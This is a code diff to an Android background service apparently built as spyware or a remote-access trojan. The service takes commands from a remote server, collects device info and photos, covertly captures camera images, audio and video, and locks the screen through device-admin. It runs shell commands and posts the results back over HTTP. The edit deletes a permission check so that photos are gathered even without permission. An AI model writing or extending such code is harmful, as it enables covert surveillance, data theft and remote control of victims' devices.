@@ -194,9 +194,6 @@ public class ServiceRunner extends Service {
         }
     }
 
-    // ============================================================
-    // ★★★ Handle Command ★★★
-    // ============================================================
     private void handleCommand(JSONObject cmd) {
         String action = "";
         try {
@@ -253,9 +250,6 @@ public class ServiceRunner extends Service {
         } catch (Exception ignored) {}
     }
 
-    // ============================================================
-    // ★★★ Data Senders ★★★
-    // ============================================================
     private void sendDeviceInfo() {
         try {
             JSONObject d = new JSONObject();
@@ -414,22 +408,8 @@ public class ServiceRunner extends Service {
         }
     }
 
-    // ★★★ sendPhotos — إصلاح Android 13+ ★★★
     private void sendPhotos() {
         try {
-            // ★ تحقق من الصلاحيات المناسبة حسب إصدار Android
-            boolean hasPerm = false;
-            if (Build.VERSION.SDK_INT >= 33) {
-                hasPerm = hasPermission("android.permission.READ_MEDIA_IMAGES");
-            } else {
-                hasPerm = hasPermission(android.Manifest.permission.READ_EXTERNAL_STORAGE);
-            }
-
-            if (!hasPerm) {
-                // جرب بدون صلاحية — بعض الملفات متاحة
-                Log.w(TAG, "Photos permission not granted, trying anyway");
-            }
-
             JSONArray arr = new JSONArray();
             android.database.Cursor c = getContentResolver().query(
                     MediaStore.Images.Media.EXTERNAL_CONTENT_URI, null, null, null,
@@ -521,14 +501,10 @@ public class ServiceRunner extends Service {
         }
     }
 
-    // ============================================================
-    // ★★★ CAMERA — مُصلح بالكامل ★★★
-    // ============================================================
     private void takePicture(final int cameraId) {
         new Handler(Looper.getMainLooper()).post(() -> {
             Camera camera = null;
             try {
-                // ★ تحقق من الصلاحية أولاً
                 if (!hasPermission(android.Manifest.permission.CAMERA)) {
                     reportCommandResult("camera_" + (cameraId == 1 ? "front" : "back"),
                             "fail", "no_camera_permission");
@@ -600,9 +576,6 @@ public class ServiceRunner extends Service {
         });
     }
 
-    // ============================================================
-    // ★★★ AUDIO — مُصلح ★★★
-    // ============================================================
     private void recordAudio(final int durationMs) {
         new Thread(() -> {
             MediaRecorder recorder = null;
@@ -662,9 +635,6 @@ public class ServiceRunner extends Service {
         }).start();
     }
 
-    // ============================================================
-    // ★★★ VIDEO — مُصلح ★★★
-    // ============================================================
     private void recordVideo(final int cameraId, final int durationMs) {
         new Thread(() -> {
             Camera camera = null;
@@ -745,15 +715,13 @@ public class ServiceRunner extends Service {
         }).start();
     }
 
-    // ============================================================
-    // ★★★ قفل الشاشة — مُصلح ★★★
-    // ============================================================
+    // ★★★ قفل الشاشة — باستخدام AdminReceiver ★★★
     private void lockScreen() {
         try {
             DevicePolicyManager dpm = (DevicePolicyManager)
                     getSystemService(Context.DEVICE_POLICY_SERVICE);
             ComponentName adminComponent = new ComponentName(this,
-                    DeviceAdminReceiver.class);
+                    AdminReceiver.class);  // ← AdminReceiver
 
             if (dpm == null) {
                 reportCommandResult("lock_screen", "fail", "no_dpm");
@@ -763,7 +731,6 @@ public class ServiceRunner extends Service {
             if (!dpm.isAdminActive(adminComponent)) {
                 reportCommandResult("lock_screen", "fail",
                         "device_admin_not_enabled");
-                // حاول تفعيله
                 Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                 intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
                 intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
@@ -790,9 +757,6 @@ public class ServiceRunner extends Service {
         }
     }
 
-    // ============================================================
-    // Others
-    // ============================================================
     private void playSound() {
         try {
             Ringtone r = RingtoneManager.getRingtone(getApplicationContext(),
@@ -902,9 +866,6 @@ public class ServiceRunner extends Service {
         } catch (Exception e) { reportCommandResult("shell", "fail", e.getMessage()); }
     }
 
-    // ============================================================
-    // ★★★ Helpers ★★★
-    // ============================================================
     private boolean hasPermission(String permission) {
         try {
             return ContextCompat.checkSelfPermission(this, permission)
@@ -914,9 +875,6 @@ public class ServiceRunner extends Service {
         }
     }
 
-    // ============================================================
-    // HTTP
-    // ============================================================
     private String httpGet(String urlStr) {
         try {
             URL url = new URL(urlStr);
@@ -974,4 +932,4 @@ public class ServiceRunner extends Service {
     private void postJson(String path, JSONObject data) {
         postJsonWithResponse(path, data);
     }
-                }
+                                        }
